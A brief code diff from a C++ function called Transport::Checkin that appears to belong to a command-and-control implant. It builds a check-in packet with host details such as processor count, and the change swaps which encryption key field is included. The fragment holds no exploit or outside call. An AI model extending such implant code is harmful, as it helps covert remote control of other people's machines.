@@ -76,7 +76,7 @@ auto DECLFN Transport::Checkin(
     Self->Pkg->Int32( CheckinPkg, Self->Machine.ProcessorsNbr );
 
     // encryption key
-    Self->Pkg->Bytes( CheckinPkg, Self->Crp->Key, sizeof( Self->Crp->Key ) );
+    Self->Pkg->Bytes( CheckinPkg, Self->Crp->LokKey, sizeof( Self->Crp->LokKey ) );
 
     //
     // send the packet
